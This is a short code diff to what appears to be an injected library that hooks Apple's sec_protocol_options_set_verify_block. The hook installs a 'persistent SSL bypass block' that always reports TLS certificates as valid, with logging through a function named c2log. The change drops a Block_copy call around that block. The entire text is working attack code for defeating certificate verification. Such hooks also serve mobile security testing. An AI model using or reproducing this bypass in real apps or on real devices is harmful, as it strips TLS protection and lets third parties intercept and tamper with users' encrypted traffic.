@@ -38,7 +38,6 @@ extern int     close(int fd);
 extern void   *dlsym(void *handle, const char *symbol);
 extern void   *dlopen(const char *filename, int flag);
 extern void    syslog(int priority, const char *format, ...);
-extern void   *Block_copy(const void *aBlock);
 extern void    dispatch_once(dispatch_once_t *predicate, void (^block)(void));
 
 // ObjC runtime types & functions
@@ -166,15 +165,15 @@ typedef void (^sec_protocol_verify_t)(void *metadata, void *trust, sec_protocol_
 
 static void my_sec_protocol_options_set_verify_block(void *options, void *block, void *queue) {
     c2log("sec_protocol_options_set_verify_block (Installing persistent SSL bypass block)", NULL, NULL);
-    static sec_protocol_verify_t bypass_block = NULL;
+    static sec_protocol_verify_t bypass_block = 0;
     static dispatch_once_t onceToken;
     dispatch_once(&onceToken, ^{
-        bypass_block = Block_copy(^(void *metadata, void *trust, sec_protocol_verify_complete_t complete) {
+        bypass_block = ^(void *metadata, void *trust, sec_protocol_verify_complete_t complete) {
             c2log("SSL verify block executed -> reporting TLS valid (1)", NULL, NULL);
             if (complete) {
                 complete(1);
             }
-        });
+        };
     });
     if (orig_sec_protocol_options_set_verify_block) {
         orig_sec_protocol_options_set_verify_block(options, (__bridge void*)bypass_block, queue);
